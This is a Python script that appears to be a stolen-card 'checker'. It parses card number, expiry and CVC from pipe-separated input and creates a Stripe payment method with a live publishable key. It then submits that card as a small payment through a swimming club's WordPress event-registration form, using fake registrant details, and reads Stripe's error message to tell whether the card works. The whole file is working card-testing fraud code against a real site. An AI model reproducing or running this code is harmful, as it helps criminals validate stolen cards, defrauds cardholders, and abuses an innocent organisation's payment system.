import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]		
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=Na&payment_user_agent=stripe.js%2F54a85a778c%3B+stripe-js-v3%2F54a85a778c%3B+card-element&key=pk_live_51CD9iHAgQ4FplA9itokhCA49dG4IJMZjF419NVd6MyxWHXDqAC43Wpcf6dDgYJPbInwHnLwv4Q06cWEObqzIXEhZ002yx8RMj2'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'www.southeastswimming.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.southeastswimming.org',
	    'referer': 'https://www.southeastswimming.org/para-swimming/development-meet-2025/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1754241825564',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=33429&_fluentform_275_fluentformnonce=08d5c7abc4&_wp_http_referer=%2Fpara-swimming%2Fdevelopment-meet-2025%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&datetime=03%2F10%2F2001&numeric-field=23&dropdown=Open%2FMale&numeric-field_1=1&input_text_13=NY&email=genpaypal02%40gmail.com&email_1=genpaypal02%40gmail.com&multi_select%5B%5D=S1&input_text_12=&BookingOne_Date%5B%5D=50m%20Freestyle&input_text_1=&custom-payment-amount=1&payment_method=stripe&gdpr-agreement=on&terms-n-condition=on&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '275',
	}
	
	response = requests.post(
	    'https://www.southeastswimming.org/wp-admin/admin-ajax.php',
	    params=params,
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
